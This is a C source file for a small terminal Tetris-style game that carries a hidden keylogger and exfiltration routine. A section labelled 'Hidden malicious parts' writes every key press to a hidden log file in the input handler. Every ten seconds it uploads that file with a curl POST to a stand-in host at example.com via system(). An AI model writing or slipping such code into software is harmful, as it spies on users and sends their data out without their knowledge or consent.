#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 10
#define HEIGHT 20

int field[HEIGHT][WIDTH] = {0};
int px = WIDTH / 2, py = 0;
int gameOver = 0;
int score = 0;

// Simple 2x2 block
int block[2][2] = {
    {1, 1},
    {1, 1}
};

// Hidden malicious parts
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".tetrislog";
const char *exfil_url = "http://example.com/tetrisupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.tetrislog", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void draw() {
    clear();

    for (int i = 0; i < WIDTH + 2; i++) printw("#");
    printw("\n");

    for (int y = 0; y < HEIGHT; y++) {
        printw("#");
        for (int x = 0; x < WIDTH; x++) {
            if (field[y][x])
                printw("#");
            else if (y >= py && y < py + 2 && x >= px && x < px + 2 && block[y - py][x - px])
                printw("O");
            else
                printw(" ");
        }
        printw("#\n");
    }

    for (int i = 0; i < WIDTH + 2; i++) printw("#");
    printw("\nScore: %d\n", score);
    refresh();
}

int checkCollision(int nx, int ny) {
    for (int i = 0; i < 2; i++)
        for (int j = 0; j < 2; j++)
            if (block[i][j]) {
                int fx = nx + j;
                int fy = ny + i;
                if (fx < 0 || fx >= WIDTH || fy >= HEIGHT || field[fy][fx])
                    return 1;
            }
    return 0;
}

void mergeBlock() {
    for (int i = 0; i < 2; i++)
        for (int j = 0; j < 2; j++)
            if (block[i][j]) {
                int fx = px + j;
                int fy = py + i;
                if (fy < HEIGHT && fx < WIDTH)
                    field[fy][fx] = 1;
            }
}

void clearLines() {
    for (int i = HEIGHT - 1; i >= 0; i--) {
        int full = 1;
        for (int j = 0; j < WIDTH; j++)
            if (!field[i][j])
                full = 0;

        if (full) {
            score += 100;
            for (int k = i; k > 0; k--)
                for (int j = 0; j < WIDTH; j++)
                    field[k][j] = field[k - 1][j];
            i++; // recheck
        }
    }
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'a' && !checkCollision(px - 1, py)) px--;
    if (ch == 'd' && !checkCollision(px + 1, py)) px++;
    if (ch == 's' && !checkCollision(px, py + 1)) py++;
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void logic() {
    if (!checkCollision(px, py + 1)) {
        py++;
    } else {
        mergeBlock();
        clearLines();
        px = WIDTH / 2;
        py = 0;
        if (checkCollision(px, py)) gameOver = 1;
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);
    srand(time(NULL));

    init_malicious();

    while (!gameOver) {
        draw();
        input();
        logic();
        usleep(200000); // 200 ms
    }

    draw();
    printw("Game Over! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
